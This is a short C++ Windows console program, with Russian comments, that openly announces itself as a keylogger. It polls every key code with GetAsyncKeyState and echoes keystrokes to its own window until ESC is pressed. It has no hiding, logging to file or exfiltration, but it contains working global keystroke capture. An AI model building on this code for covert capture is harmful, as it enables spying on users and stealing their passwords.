#include <windows.h>
#include <iostream>
#include <cctype>
#include <fstream>

int main()
{
    std::cout << "Keylogger has been activated\n";
    while (true)
    {
		
        for (int i = 8; i < 256; i++)          // начинаем с 8, чтобы пропустить служебные
        {
            if (GetAsyncKeyState(i) & 0x8000)  // клавиша нажата
            {
                if (i == VK_ESCAPE)
                {
                    std::cout << "\n[ESC] - Выход\n";
                    return 0;
                }
                else if (i == VK_RETURN)
                    std::cout << "[ENTER]\n";
                else if (i == VK_SPACE)
                    std::cout << " ";
                else if (i == VK_BACK)
                    std::cout << "[BACK]";
                else if (i == VK_TAB)
                    std::cout << "[TAB]";
                else
                {
                    // Для обычных символов
                    if (GetAsyncKeyState(VK_SHIFT) & 0x8000)
                        std::cout << (char)toupper(i);
                    else
                        std::cout << (char)tolower(i);
                }
            }
        }
        Sleep(10);   // Очень важно! 10 миллисекунд паузы
    }

    return 0;
}
